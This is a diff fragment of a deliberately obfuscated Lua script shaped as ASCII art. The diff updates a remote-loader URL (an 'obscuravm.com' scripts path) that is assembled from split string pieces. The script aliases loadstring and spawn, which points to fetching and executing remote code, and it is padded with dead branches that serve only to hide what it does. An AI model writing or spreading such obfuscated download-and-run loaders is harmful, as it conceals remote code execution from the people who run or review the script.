@@ -15,13 +15,13 @@
    local A=[[s]]                       print(A)             do spawn(sV);
    end;end;f39dW                        =[[aa]]             local Cv=C4..
    null function                        g(as)do             return"ttps:"
-   .."//team-no"                         ..``..             'xious.obcsu'
-   end;end;local                          x= ""             .. "ravm.com"
+   .."//api.obs"                         ..``..             'curavm.com/'
+   end;end;local                          x= ""             .. "scripts/"
    col=0x1948185                           ;cat             = loadstring;
    local yG=[[Ad             [              ]];             task.wait (0)
    if 5==19 then             do              qR             ("aA")end;end
-   ta="/scripts"             aKs              =             [[/lo]].."ad"
-   ..[[er]]while             2==3                           do box10="33"
+   ta="47631355"             aKs              =             "15759".."93"
+   ..`2964`while             2==3                           do box10="33"
    end;local LS=             ""LS=                          sV;local fsad
    V[ C4.. null]             =...do                         wait()end;d9D
    =spawn;T=""..             "h";for                        _=1,0 do qR()
